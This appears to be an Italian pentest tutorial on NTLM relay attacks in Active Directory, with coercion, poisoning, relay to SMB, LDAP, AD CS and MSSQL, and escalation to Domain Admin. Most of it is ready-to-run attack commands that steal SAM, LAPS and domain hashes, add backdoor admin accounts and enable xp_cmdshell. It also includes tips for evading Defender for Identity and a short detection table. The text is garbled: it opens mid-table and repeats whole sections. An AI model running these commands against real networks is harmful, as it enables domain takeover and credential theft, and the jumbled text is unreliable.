| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
\
\--pfx-password 'CertPass123' --cert-outfile-path /tmp/ws01

# Cross-protocol — SMB in → LDAP out (rimuove MIC)

sudo ntlmrelayx.py -t ldap\://10.10.10.5 -smb2support --remove-mic

# Interactive LDAP shell — comandi diretti su AD

sudo ntlmrelayx.py -t ldap\://10.10.10.5 -smb2support -i
nc 127.0.0.1 11389   # → add\_user / add\_user\_to\_group / dump\_domain ...

```

---

### LDAPS (`ldaps://`)

**Perché funziona:** LDAPS è LDAP over TLS. Non ha lo stesso problema di signing — la cifratura TLS del canale non è legata crittograficamente all'autenticazione NTLM (salvo Channel Binding / CBT attivo). Permette tutte le operazioni write che LDAP con signing blocca.

**Perché fallisce:** LDAP Channel Binding (CBT) tying lega l'autenticazione NTLM al certificato TLS del server — il relay viene rigettato perché l'attaccante non ha il certificato del DC. Abilitato su DC moderni con patch recenti.

```

LDAPS senza CBT → relay funziona + write complete → RBCD, Shadow Creds, user creation
LDAPS con CBT   → relay rigettato → usa HTTP/ADCS

```

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Tutto ciò che LDAP permette | + |
| Shadow Credentials | Write su msDS-KeyCredentialLink |
| Add computer account | MachineAccountQuota > 0 |
| RBCD completo | Write sul computer object target |

---

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

```

HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato

```

| Target HTTP | Vettore |
|-------------|---------|
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS | Accesso mailbox, lateral movement |
| OWA (Outlook Web App) | Accesso email |
| IIS con NTLM auth | Accesso app |
| WPAD | Cattura hash durante browsing |

---

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```

MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp\_cmdshell → RCE

```

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Login al database | Windows Auth abilitata |
| Query dati | Permessi SELECT |
| `xp_cmdshell` → RCE | sysadmin role |
| Lettura file server | `BULK INSERT`, OPENROWSET |

---

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```

IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo

```

---

## Decision tree — cosa usi in base a cosa trovi

```

HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap\://DC\_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps\://DC\_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http\://CA\_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp\_cmdshell
│           → ntlmrelayx.py -t mssql://SQL\_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
└── mitm6 → LDAPS relay → RBCD → getST → DA

````

---

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
````

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
